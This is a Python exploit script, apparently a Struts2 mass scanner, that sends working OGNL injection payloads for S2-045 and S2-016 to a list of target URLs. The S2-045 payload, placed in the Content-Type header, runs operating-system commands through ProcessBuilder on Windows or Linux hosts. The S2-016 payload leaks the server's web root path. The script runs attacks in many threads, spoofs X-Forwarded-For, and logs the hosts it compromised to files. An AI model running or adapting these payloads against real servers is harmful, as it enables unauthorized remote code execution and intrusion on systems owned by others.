#-*- coding=utf-8 -*-;
import sys
import requests
import argparse
import threading
import queue
class exp(object):
    def __init__(self,urls):
        try:
            connect=requests.get(urls,timeout=3)
            if connect.status_code==200:
                self.the016(urls)
                self.the045(urls)
        except:
            print("Can't connect")
            
    def the045(self,urls):
            cmd='whoami'
            payload = "Content-Type:%{(#_='multipart/form-data')."
            payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            payload += "(#_memberAccess?"
            payload += "(#_memberAccess=#dm):"
            payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            payload += "(#ognlUtil.getExcludedPackageNames().clear())."
            payload += "(#ognlUtil.getExcludedClasses().clear())."
            payload += "(#context.setMemberAccess(#dm))))."
            payload += "(#cmd='%s')." % cmd
            payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
            payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
            payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            payload += "(#ros.flush())}"
            headers={
                    'User-Agent':"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) "\
                                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" ,
                    'Content-Type' : payload
                        }
            data = '--40a1f31a0ec74efaa46d53e9f4311353\r\n' \
                               'Content-Disposition: form-data; name="image1"\r\n' \
                               'Content-Type: text/plain; charset=utf-8\r\n\r\ntest\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
            try:
                res=requests.post(urls,data,verify=False,headers=headers,timeout=(4,20))
                result=res.text.strip()
                if res.status_code==200 and len(result)<100:
                    print('User:'+result+'   The 045 is True!')
                    with open('success_045.txt','a') as f:
                        f.write(urls+'\n')
                else:
                    print('The 045 isn\'t exist')
            except Exception as e:
                print('The content  isn\'t exist')
    def the016(self,urls):
            payload='''?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}       '''
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                'Accept-Encoding': 'gzip, deflate',
                'X-Forwarded-For': '8.8.8.8',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
                }
            try:
                res=requests.get(urls+payload,headers=headers)
                result=res.text.strip()
                if res.status_code == 200 and len(result)<100:
                    print(result+'    The 016 is True')
                    with open('success_016.txt','a') as f:
                        f.write(urls+'\n')
                else:
                    print('The 016 isn\'t exist')
            except:
                print('The content  isn\'t exist')

lock = threading.Lock()
    
if __name__=="__main__":
   parser=argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,description='Struts2 Scanner By:ch1st',usage='scan.py [options]')
   parser.add_argument('-f',metavar='File')
   parser.add_argument('-u',metavar='url')
   args=parser.parse_args()
   Queue=queue.Queue()
   threads=[] 
   if args.f is not None:
       with open(args.f,'r') as target:
           for i in range(10):
                for f in target.readlines():
                    f=f.strip()
                    print(f)
                    t=threading.Thread(target=exp,args=(f,))
                    threads.append(t)
                    t.start()
                for t in threads:
                    t.join()
   else:
       if args.u is not None:
           exp(args.u)
    
   
    
    
